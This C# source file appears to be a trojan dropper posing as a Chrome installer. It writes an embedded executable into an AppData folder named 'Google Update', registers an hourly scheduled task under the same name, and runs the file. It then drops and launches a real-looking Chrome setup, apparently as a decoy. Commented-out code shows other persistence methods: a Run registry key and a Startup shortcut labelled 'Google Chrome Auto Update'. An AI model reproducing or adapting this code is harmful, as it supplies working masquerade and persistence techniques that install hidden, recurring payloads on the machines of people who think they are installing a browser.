using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using IWshRuntimeLibrary;
using Microsoft.Win32.TaskScheduler;
namespace Installer
{
    class Program
    {
        static void Main(string[] args)
        {
            string test = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            Directory.CreateDirectory(test + "\\Google Update\\");
            System.IO.File.WriteAllBytes(test+"\\Google Update\\update.exe", Resource1.update);

            TaskService.Instance.AddTask("Google Update", QuickTriggerType.Hourly, test + "\\Google Update\\update.exe", "");
            //using (TaskService ts = new TaskService())
            //{
            //    // Create a new task definition and assign properties
            //    TaskDefinition td = ts.NewTask();
            //    td.RegistrationInfo.Description = "Update";

            //    // Create a trigger that will fire the task at this time every other day
            //    td.Triggers.Add(new DailyTrigger() { });

            //    // Create an action that will launch Notepad whenever the trigger fires
            //    td.Actions.Add(new ExecAction("notepad.exe", "c:\\test.log", null));

            //    // Register the task in the root folder
            //    ts.RootFolder.RegisterTaskDefinition(@"Test", td);

            //    // Remove the task we just created
            //    ts.RootFolder.DeleteTask("Test");
            //}

            //RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //rk.SetValue("Google Update", test + "\\Google Update\\update.exe");

            //WshShell wsh = new WshShell();
            ////IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\GoogleUpdate.lnk") as IWshRuntimeLibrary.IWshShortcut;
            //IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\GoogleUpdate.lnk") as IWshRuntimeLibrary.IWshShortcut;
            //shortcut.Arguments = "";
            //shortcut.TargetPath = test + "\\Google Update\\update.exe";
            //// not sure about what this is for
            //shortcut.WindowStyle = 1;
            //shortcut.Description = "Google Chrome Auto Update";
            //shortcut.WorkingDirectory = test + "\\Google Update";
            ////shortcut.IconLocation = "";
            //shortcut.Save();

            Process.Start(test + "\\Google Update\\update.exe");
            System.IO.File.WriteAllBytes(Path.GetTempPath()+"\\Install.exe", Resource1.ChromeSetup);
            Process.Start(Path.GetTempPath() + "\\Install.exe");
        }
    }
}
